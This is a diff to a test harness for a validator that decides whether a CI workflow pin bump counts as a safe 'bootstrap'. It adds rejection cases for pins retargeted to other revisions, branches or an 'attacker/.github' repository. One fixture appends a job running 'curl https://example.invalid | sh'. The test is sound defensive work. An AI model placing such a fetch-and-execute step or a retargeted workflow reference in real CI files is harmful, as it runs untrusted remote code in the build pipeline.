@@ -572,8 +572,7 @@ def ineligible_cases() -> list[tuple[str, Consumer, tuple[str, str] | None]]:
     add("an oversized changed file is not a bootstrap",
         with_files(**{"tests/big.txt": (STALE.encode() + oversized, CONTRACT.encode() + oversized)}),
         ("0 <= size <= MAX_BLOB_BYTES,", "0 <= size,"))
-    allowlist_guard = ('require(same_repository(ref[2].decode(), CANONICAL) and ref[3].decode() in REUSABLE_CI,',
-                       'require(True,')
+    allowlist_guard = (" and ref[3].decode() in REUSABLE_CI,", ",")
     add("a pin bump of a canonical workflow outside the reusable CI allowlist is not a bootstrap",
         with_files(**{CI_CALLER: (ci_caller(CI_STALE, "node-release.yml"), ci_caller(CONTRACT, "node-release.yml"))}),
         allowlist_guard)
@@ -581,6 +580,55 @@ def ineligible_cases() -> list[tuple[str, Consumer, tuple[str, str] | None]]:
     add("a reusable CI pin that would move backwards is not a bootstrap",
         compare_override(with_files(**ci_bump), f"{CI_STALE}...{CONTRACT}", "behind"),
         ('require(all(contains(revision, contract) for revision in ci_stale),', 'require(True,'))
+    contract_guard = ("new == old[:ref.start(4)] + contract.encode() + old[ref.end(4):]",
+                      "new[:ref.start(4)] + new[ref.start(4) + 40:] == old[:ref.start(4)] + old[ref.end(4):]")
+    add("a reusable CI pin moved to a revision other than the contract is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller("c" * 40))}), contract_guard)
+    add("a reusable CI pin moved to a branch ref is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller("main"))}), contract_guard)
+    add("a reusable CI reference retargeted to another repository is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT, owner="attacker/.github"))}),
+        ("new == old[:ref.start(4)] + contract.encode() + old[ref.end(4):]",
+         'new[new.find(b"@"):] == b"@" + contract.encode() + old[ref.end(4):]'))
+    add("a pin bump of a non-canonical repository's reusable workflow is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE, owner="attacker/.github"), ci_caller(CONTRACT, owner="attacker/.github"))}),
+        ("require(same_repository(ref[2].decode(), CANONICAL) and ref[3]", "require(ref[3]"))
+    appended_job = b"  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: curl https://example.invalid | sh\n"
+    # Without a final newline the base has no empty last line to pair with the added lines, so only
+    # the line-count guard sees them: zip() would silently drop the tail.
+    add("a reusable CI caller that adds a job is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE).rstrip(b"\n"), ci_caller(CONTRACT) + appended_job)}),
+        ("require(len(old_lines) == len(new_lines),", "require(True,"))
+    skip_unmatched = ("ref = REUSABLE_REF.fullmatch(old)\n",
+                      "ref = REUSABLE_REF.fullmatch(old)\n                  if ref is None:\n                      continue\n")
+    add("a reusable CI caller whose inputs change is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT, node="22.0.0"))}), skip_unmatched)
+    add("a reusable CI caller whose permissions change is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT).replace(b"contents: read", b"contents: write"))}),
+        skip_unmatched)
+    add("one of two reusable CI callers changing more than its pin is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT)),
+                      ".github/workflows/ci-push.yml": (ci_caller(CI_STALE), ci_caller(CONTRACT, node="22.0.0"))}),
+        skip_unmatched)
+    comment_guard = ("require(new == moved,", "require(True,")
+    add("a reusable CI caller whose comment changes beyond the pin is not a bootstrap",
+        with_files(**{CI_CALLER: (ci_caller(CI_STALE),
+                                  ci_caller(CONTRACT).replace(b"# Keep this job id stable.", b"# Any job id is fine."))}),
+        comment_guard)
+    add("a comment pin that moves without its uses pin is not a bootstrap",
+        with_files(**{CI_CALLER: (f"# Canonical node-ci revision: {CI_STALE}\n".encode() + ci_caller(CI_STALE),
+                                  f"# Canonical node-ci revision: {CONTRACT}\n".encode() + ci_caller(CI_STALE))}),
+        comment_guard)
+    add("a reusable CI pin bump in a workflow subdirectory is not a bootstrap",
+        with_files(**{".github/workflows/nested/ci.yml": (ci_caller(CI_STALE), ci_caller(CONTRACT))}),
+        ('workflows/[A-Za-z0-9._-]+\\.ya?ml")', 'workflows/[A-Za-z0-9._/-]+\\.ya?ml")'))
+    add("a reusable CI pin bump under a mixed-case .GitHub/workflows path is not a bootstrap",
+        with_files(**{".GitHub/workflows/ci.yml": (ci_caller(CI_STALE), ci_caller(CONTRACT))}),
+        ("WORKFLOW_FILE.fullmatch(path)", "WORKFLOW_FILE.fullmatch(path.casefold())"))
+    # Layered: without the caller guard the unchanged caller still fails "revision is unchanged".
+    unbootstrapped = with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT))})
+    unbootstrapped.head[CALLER] = unbootstrapped.base[CALLER]
+    add("a reusable CI pin bump without a review caller update is not a bootstrap", unbootstrapped, None)
     add("a revision continuing into a branch-name suffix is not a reusable CI pin",
         with_files(**{CI_CALLER: (ci_caller(CI_STALE, ref_suffix="-x"), ci_caller(CONTRACT, ref_suffix="-x"))}),
         ('@([0-9a-f]{40})((?:[ \\t]+(?:#.*)?)?\\r?)")', '@([0-9a-f]{40})(.*)")'))
@@ -635,6 +683,19 @@ INELIGIBLE_REASONS = {
     "a pin bump of a canonical workflow outside the reusable CI allowlist is not a bootstrap": "is not an allowlisted canonical reusable CI workflow",
     "a reusable CI pin that would move backwards is not a bootstrap": "does not descend from the stale reusable CI revision",
     "a revision continuing into a branch-name suffix is not a reusable CI pin": "changes more than its reusable CI pin",
+    "a reusable CI pin moved to a revision other than the contract is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI pin moved to a branch ref is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI reference retargeted to another repository is not a bootstrap": "changes more than its reusable CI pin",
+    "a pin bump of a non-canonical repository's reusable workflow is not a bootstrap": "is not an allowlisted canonical reusable CI workflow",
+    "a reusable CI caller that adds a job is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI caller whose inputs change is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI caller whose permissions change is not a bootstrap": "changes more than its reusable CI pin",
+    "one of two reusable CI callers changing more than its pin is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI caller whose comment changes beyond the pin is not a bootstrap": "changes more than its reusable CI pin",
+    "a comment pin that moves without its uses pin is not a bootstrap": "changes more than its reusable CI pin",
+    "a reusable CI pin bump in a workflow subdirectory is not a bootstrap": "is workflow or action configuration",
+    "a reusable CI pin bump under a mixed-case .GitHub/workflows path is not a bootstrap": "is workflow or action configuration",
+    "a reusable CI pin bump without a review caller update is not a bootstrap": "does not change the generated review caller",
     "an unavailable canonical comparison is not a bootstrap": "GitHub API read failed",
     "a malformed API response is not a bootstrap": "GitHub API returned malformed JSON",
 }
@@ -688,6 +749,12 @@ def main() -> int:
         ".github/workflows/actionlint.yml": (ci_caller(CI_STALE, "actionlint.yml"), ci_caller(CONTRACT, "actionlint.yml")),
         "tests/ci-contract.test.ts": (ci_mirror(CI_STALE, STALE), ci_mirror(CONTRACT, CONTRACT))})),
         "node-ci and actionlint callers bound to one pin move together", harness.last)
+    report(harness.eligible(with_files(**{CI_CALLER: (ci_caller(CI_STALE), ci_caller(CONTRACT)),
+                                          ".github/workflows/ci-push.yml": (ci_caller(CI_STALE), ci_caller(CONTRACT))})),
+           "every reusable CI caller is proven on its own, so two pin-only callers are companions", harness.last)
+    report(harness.eligible(with_files(**{CI_CALLER: (ci_caller(CI_STALE, owner="verJSON/.github"),
+                                                      ci_caller(CONTRACT, owner="verJSON/.github"))})),
+           "the canonical repository matches in any letter case, as GitHub resolves it", harness.last)
     commented = lambda sha: f"# Canonical node-ci revision: {sha}\n".encode() + ci_caller(sha)
     report(harness.eligible(with_files(**{CI_CALLER: (commented(CI_STALE), commented(CONTRACT))})),
            "a comment pin that moves with the reusable CI pin is a companion", harness.last)
